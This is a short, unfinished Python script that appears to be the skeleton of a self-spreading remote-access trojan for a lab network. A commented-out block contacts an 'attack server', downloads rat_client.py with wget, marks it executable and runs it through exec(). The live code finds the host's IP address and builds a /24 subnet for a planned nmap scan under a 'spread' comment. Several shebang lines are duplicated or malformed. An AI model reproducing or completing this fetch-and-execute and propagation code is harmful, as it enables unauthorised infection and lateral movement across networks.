#!/usr/bin/env python3
#!/usr/bin/env python3
#!/usr/bin/env import 
#!/usr/bin/bash

import socket, subprocess, os, sys
import re


def main():
#connect to our attack server and get the client file
    # try:
        # #try to ping server first
        # subprocess.run(["ping", "-c", "1", "192.168.56.113"])
        # #try to download the file from http server running
        # subprocess.run(["wget", "192.168.56.113:80/RAT/rat_client.py"])
        # #change permissions
        # subprocess.run(["chmod",  "+x",  "rat_client.py"])
        # #execute client file
        # exec(open("rat_client.py").read())
    # except:
    #     print("error")

#spread 

    #Find the current IP address of the machine, find subnet info to search with nmap
    foundIP=''
    #ip address regex
    ipPattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
    #get ip address info on our host only adapter = enp0s8
    ipResult = subprocess.run(["ifconfig", "enp0s8"],capture_output=True)
    #print(ipResult.stdout)

    #search for IP address from command we ran
    foundIP = ipPattern.search(str(ipResult))[0]
    print(foundIP)

    #TODO  probably could be done more elegantly....
    #create subnet string in cidr notation 
    foundSubnet = ''
    dotcount = 0
    for char in foundIP:
        if dotcount >= 3:
            foundSubnet+= '0/24'
            break
        elif char != '.' and dotcount < 3:
            foundSubnet+= char
        else:
            foundSubnet+=char
            dotcount+=1
    print(foundSubnet)

#perform nmap scan
    




#Dunder check

if __name__ == "__main__":
	main()
